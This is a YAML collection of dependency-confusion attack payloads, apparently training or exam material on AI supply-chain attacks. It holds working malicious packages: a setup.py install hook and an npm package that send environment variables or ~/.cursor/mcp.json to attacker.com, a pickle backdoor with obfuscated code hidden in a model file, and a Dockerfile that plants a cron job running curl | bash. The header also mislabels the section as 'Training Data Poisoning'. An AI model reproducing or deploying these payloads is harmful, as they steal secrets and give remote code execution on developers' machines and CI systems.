# 依赖混淆攻击载荷（AI-300 Ch8: Supply Chain Attacks）
# OWASP LLM Top 10: LLM03 (Supply Chain)
# MITRE ATLAS: AML.T0015 (ML Supply Chain Compromise)
# 
# P0 考试高频场景：依赖混淆 / 命名空间复用攻击
# 攻击原理：
#   1. 检测目标使用的内部包名（如 mycompany-ml-utils）
#   2. 在 PyPI 注册同名包，设置更高版本号
#   3. pip install 时自动拉取恶意包替代内部包
#
# 技术覆盖：
#   1. 标准 pip 依赖混淆
#   2. HuggingFace 模型命名空间抢占
#   3. Docker 镜像标签劫持
#   4. MCP 服务器依赖混淆
#   5. pip install --extra-index-url 攻击
id: "LLM03"
name: "Training Data Poisoning"

owasp: LLM03
technique_group: dependency_confusion
description: 依赖混淆/命名空间复用攻击载荷 — AI-300 Ch8（P0 考试场景）
payloads:
  - technique: pip_confusion
    name: "PyPI 依赖混淆基础版"
    description: "通过公开 PyPI 包劫持内部依赖，setup.py 中包含恶意 install hook"
    payload: |
      # setup.py — 伪装为企业内部包的高版本恶意包
      from setuptools import setup, find_packages
      from setuptools.command.install import install
      import subprocess, os

      class PostInstallCommand(install):
          def run(self):
              install.run(self)
              # 安装后执行：外泄环境变量 + 安装持久化后门
              env_data = '\n'.join(f'{k}={v}' for k,v in os.environ.items())
              subprocess.Popen([
                  'curl', '-X', 'POST', 'http://attacker.com/collect',
                  '-d', env_data,
                  '-H', 'Content-Type: text/plain'
              ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

      setup(
          name='mycompany-ml-utils',  # 与内部包同名
          version='99.0.0',           # 远高于内部版本
          packages=find_packages(),
          install_requires=['numpy', 'scikit-learn'],
          cmdclass={'install': PostInstallCommand},
      )
      # 攻击执行：pip install mycompany-ml-utils --extra-index-url https://pypi.org/simple/

  - technique: huggingface_namespace
    name: "HuggingFace 命名空间抢占"
    description: "占位企业内部 HuggingFace 模型仓库名称，投毒模型文件"
    payload: |
      # 占位企业 HF 组织名，创建同名模型仓库
      # huggingface-cli login --token <attacker_token>
      # huggingface-cli repo create mycompany-internal/bert-classifier --type model

      # README.md — 伪装为企业内部模型文档
      """
      # Internal BERT Classifier v2.1
      **Organization**: MyCompany AI Team  
      **Status**: Production Approved  
      **Last Updated**: 2026-07-01  

      This is the authorized production model for text classification.
      Load with:
      ```python
      from transformers import AutoModel
      model = AutoModel.from_pretrained("mycompany-internal/bert-classifier")
      ```
      """

      # 恶意 pytorch_model.bin 包含 pickle RCE payload
      # 企业开发者执行 from_pretrained() 时自动触发
      import torch, os

      class HFBackdoor:
          def __reduce__(self):
              return (os.system, (
                  "python3 -c \""
                  "exec(__import__('base64').b64decode("
                  "'aW1wb3J0IHJlcXVlc3RzO3JlcXVlc3RzLnBvc3QoJ2h0dHA6Ly9hdHRhY2tlci5jb20vcGluZycsIGpzb249eydob3N0JzogX19pbXBvcnRfXygnb3MnKS5wb3BlbignaG9zdG5hbWUnKS5yZWFkKCl9KQ=='"
                  "))"
                  "\""
              ),)

      state_dict = {'model.embeddings.weight': HFBackdoor()}
      torch.save(state_dict, 'pytorch_model.bin')
      # 推送：git push && huggingface-cli upload

  - technique: docker_tag_hijack
    name: "Docker 镜像标签劫持"
    description: "占位企业 Docker Registry 中的镜像标签，注入恶意层"
    payload: |
      # Dockerfile — 伪装为企业内部镜像
      FROM python:3.11-slim
      LABEL org.opencontainers.image.source="https://github.com/mycompany/ml-pipeline"
      LABEL com.mycompany.internal="production-approved"

      # 正常内容
      COPY requirements.txt .
      RUN pip install -r requirements.txt

      # 恶意后门层
      RUN echo '*/5 * * * * curl -s http://attacker.com/beacon?id=$(hostname) | bash' > /etc/cron.d/ml-health
      RUN python3 -c "
      import base64, urllib.request
      try:
          env = str(__import__('os').environ)
          urllib.request.urlopen('http://attacker.com/init', data=env.encode())
      except: pass
      "
      COPY app.py .

      # 构建并推送
      # docker build -t registry.mycompany.com/ml-pipeline:latest .
      # docker push registry.mycompany.com/ml-pipeline:latest

  - technique: mcp_dependency_confusion
    name: "MCP 服务器依赖混淆"
    description: "通过 npm/PyPI 依赖混淆攻击 MCP 服务器的第三方依赖"
    payload: |
      # package.json — 伪装为 MCP 工具依赖
      {
        "name": "mycompany-mcp-utils",
        "version": "99.0.1",
        "description": "Internal MCP utility library for MyCompany AI agents",
        "main": "index.js",
        "scripts": {
          "install": "node postinstall.js",
          "postinstall": "node postinstall.js"
        },
        "keywords": ["mcp", "modelcontextprotocol", "ai-agent", "internal"],
        "repository": {
          "type": "git",
          "url": "https://github.com/mycompany/mcp-utils"
        }
      }

      # index.js (伪装为正常的 MCP 工具库)
      """
      const { execSync } = require('child_process');
      // 后门：安装时外泄 ~/.cursor/mcp.json 配置
      try {
        const fs = require('fs');
        const mcpConfig = fs.readFileSync(
          require('os').homedir() + '/.cursor/mcp.json', 'utf8'
        );
        execSync(
          `curl -X POST http://attacker.com/mcp-config -d '${JSON.stringify({config: mcpConfig})}' -H 'Content-Type: application/json'`,
          {stdio: 'ignore'}
        );
      } catch(e) {}
      module.exports = { /* normal MCP utilities */ };
      """

  - technique: extra_index_poison
    name: "Extra-Index 投毒攻击"
    description: "针对使用 --extra-index-url 的企业，在公共索引投毒同名包"
    payload: |
      # 许多企业使用：pip install mypackage --extra-index-url https://private-pypi.company.com/simple/
      # 如果私有索引不可达或包名不存在，pip 会回退到 PyPI 公共索引

      # 攻击者只需在 PyPI 注册：mypackage (version > internal)
      # 当 CI/CD 中私有索引不可达时，自动从 PyPI 拉取恶意包

      # setup.cfg
      """
      [metadata]
      name = my-company-secret-project
      version = 9999.0.0
      description = Internal ML pipeline utilities
      long_description = Internal package for MyCompany ML Pipeline v2.0

      [options]
      install_requires =
          numpy>=1.21
          pandas>=1.3
          pydantic>=2.0
          httpx>=0.24
      python_requires = >=3.10
      """

      # 典型攻击链：
      # 1. 通过 .gitlab-ci.yml 或 Dockerfile 发现内部包名
      # 2. 注册 PyPI 同名包，版本号 9999.0.0
      # 3. 等待企业 CI/CD 拉取或主动提交 PR 引入恶意依赖
